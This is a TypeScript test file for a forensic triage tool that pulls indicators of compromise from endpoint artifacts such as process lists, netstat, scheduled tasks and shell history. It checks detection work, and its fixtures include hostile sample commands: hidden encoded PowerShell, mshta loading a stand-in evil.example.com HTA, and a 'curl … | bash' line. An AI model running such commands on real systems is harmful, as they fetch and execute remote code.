import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { findings } from './findings.ts';
import { aiContext, areas, extractIocs, headline, iocSweepText } from './triageSummary.ts';

const SOURCES = {
  'Windows.System.Pslist': [
    { Name: 'svchost.exe', Pid: 4, Exe: 'C:\\Windows\\System32\\svchost.exe', CommandLine: 'svchost.exe -k netsvcs' },
    { Name: 'upd.exe', Pid: 66, Exe: 'C:\\Users\\bob\\AppData\\Roaming\\upd.exe', CommandLine: 'C:\\Users\\bob\\AppData\\Roaming\\upd.exe',
      Hash: { SHA256: 'A'.repeat(64), MD5: 'b'.repeat(32) } },
    { Name: 'powershell.exe', Pid: 70, Exe: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' },
  ],
  'Windows.Network.Netstat': [
    { Name: 'upd.exe', Raddr: { IP: '203.0.113.7', Port: 443 } },
    { Name: 'x', Raddr: { IP: '10.0.0.2', Port: 445 } },
  ],
  'Windows.System.TaskScheduler/Analysis': [
    { TaskName: '\\Updater', Command: 'mshta.exe', Arguments: 'http://evil.example.com/a.hta' },
  ],
  'Windows.Forensics.Amcache': [
    { FullPath: 'C:\\Users\\bob\\Downloads\\tool.exe', SHA1: '0000' + 'c'.repeat(40) },
    { FullPath: 'C:\\Program Files\\App\\app.exe', SHA1: '0000' + 'd'.repeat(40) },
  ],
};

describe('triage summary', () => {
  const found = findings(SOURCES);
  const iocs = extractIocs(SOURCES, found);
  const has = (kind: string, value: string) => iocs.some(i => i.kind === kind && i.value === value);

  it('extracts indicators by rule', () => {
    assert.ok(has('ip', '203.0.113.7'));
    assert.ok(!iocs.some(i => i.value === '10.0.0.2'));
    assert.ok(has('url', 'http://evil.example.com/a.hta'));
    assert.ok(has('domain', 'evil.example.com'));
    assert.ok(has('sha256', 'a'.repeat(64)));
    assert.ok(has('sha1', 'c'.repeat(40)), 'Amcache hash from a user-writable folder');
    assert.ok(!has('sha1', 'd'.repeat(40)), 'not every program on the host');
    assert.ok(has('path', 'C:\\Users\\bob\\AppData\\Roaming\\upd.exe'));
    const cmds = iocs.filter(i => i.kind === 'command').map(i => i.context);
    assert.ok(cmds.some(c => c.startsWith('Encoded PowerShell')));
    assert.ok(cmds.some(c => c.startsWith('mshta')));
    assert.equal(iocs[0].kind, 'command');
  });

  it('groups artifacts into areas with flagged counts', () => {
    const a = areas(SOURCES, found);
    assert.deepEqual(a.map(x => x.id), ['processes', 'network', 'persistence', 'execution']);
    assert.equal(a[0].rows, 3);
    assert.ok(a[0].flagged >= 1);
    assert.equal(a[3].flagged, 0);
  });

  it('builds the IOC sweep text, headline and AI context', () => {
    const t = iocSweepText(iocs);
    assert.match(t, /^ip,203\.0\.113\.7$/m);
    assert.doesNotMatch(t, /^command,/m);
    assert.equal(headline(found, iocs).tone, 'bad');
    assert.equal(headline([], []).tone, 'ok');
    const ctx = aiContext('host1', 'C.1', 'F.1', SOURCES, found, iocs);
    assert.match(ctx, /Host: host1 \(C\.1\)/);
    assert.match(ctx, /203\.0\.113\.7/);
    assert.match(ctx, /-enc SQBF/);
  });

  it('does not flag ordinary commands', () => {
    const s = { 'Linux.Sys.BashHistory': [{ Line: 'curl -o x.tar.gz https://example.org/x.tar.gz' }, { Line: 'ls -la' }] };
    const i = extractIocs(s, []);
    assert.ok(!i.some(x => x.kind === 'command'));
    assert.ok(i.some(x => x.kind === 'domain' && x.value === 'example.org'));
    const bad = extractIocs({ 'Linux.Sys.BashHistory': [{ Line: 'curl -s http://1.2.3.4/x | bash' }] }, []);
    assert.ok(bad.some(x => x.kind === 'command'));
    assert.ok(bad.some(x => x.kind === 'ip' && x.value === '1.2.3.4'));
  });
});

describe('named sources', () => {
  it('matches Artifact/Source names and extensionless Linux paths', () => {
    const s = {
      'Linux.Network.Netstat/TCP4': [{ Name: 'upd', RemoteAddr: '198.51.100.9' }],
      'Linux.Network.Netstat/TCP6': [],
      'Linux.Sys.Crontab/CronTabs': [{ Command: '/tmp/x' }],
      'Linux.Sys.Pslist': [{ Name: 'upd', Pid: 9, Exe: '/tmp/upd', CommandLine: '/tmp/upd' }],
    };
    const f = findings(s);
    const a = areas(s, f);
    assert.deepEqual(a.map(x => x.id), ['processes', 'network', 'persistence']);
    assert.ok(f.some(x => x.id === 'net-external'));
    const i = extractIocs(s, f);
    assert.ok(i.some(x => x.kind === 'ip' && x.value === '198.51.100.9'));
    assert.ok(i.some(x => x.kind === 'path' && x.value === '/tmp/upd'));
  });
});
